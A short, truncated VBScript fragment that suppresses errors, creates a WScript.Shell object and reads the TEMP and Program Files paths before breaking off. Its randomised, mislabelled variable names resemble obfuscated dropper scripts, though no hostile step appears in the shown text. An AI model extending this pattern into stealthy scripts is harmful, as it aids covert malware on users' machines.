Function FetchPolicyBlock15()
On Error Resume Next
  Dim strLine784,blnSynced69,blnIdle36
  Set strLine784=CreateObject("WScript.Shell")
  blnSynced69=strLine784.ExpandEnvironmentStrings("%TEMP%")
  blnIdle36=strLine784.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnSynced69)>0 And Len(blnIdle36)>0 Then
